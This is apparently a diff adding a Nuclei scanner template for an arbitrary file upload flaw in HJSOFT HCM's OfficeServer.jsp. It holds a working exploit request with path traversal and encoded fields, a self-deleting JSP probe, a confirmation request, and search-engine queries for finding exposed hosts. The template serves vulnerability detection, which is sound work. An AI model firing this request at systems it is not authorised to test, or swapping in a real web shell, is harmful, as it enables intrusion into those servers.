@@ -1,0 +1,51 @@
+id: hjsoft-hcm-officeserver-fileupload
+
+info:
+  name: HJSOFT HCM OfficeServer - File Upload
+  author: p1z
+  severity: critical
+  description: |
+    宏景人力资源信息管理系统 OfficeServer 文件任意上传漏洞
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/132251036
+  metadata:
+    fofa-query: app="HJSOFT-HCM"
+    hunter-query: app.name="宏景 HCM"
+    verified: true
+  tags: HJSoft-HCM
+
+requests:
+  - raw:
+      - |
+        POST /w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Connection: close
+         
+        DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ
+        OPTION=U0FWRUZJTEU=
+        currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
+        FILETYPE=Li5cMW5mby5qc3A=
+        RECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
+        originalFileId=wV66
+        originalCreateDate=wUghPB3szB3Xwg66
+        FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
+        needReadFile=yRWZdAS6
+        originalCreateDate=wLSGP4oEzLKAz4=iz=66
+         
+        <%out.println("hello world");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+      - |
+        GET /1nfo.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - "hello world"
+
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200"
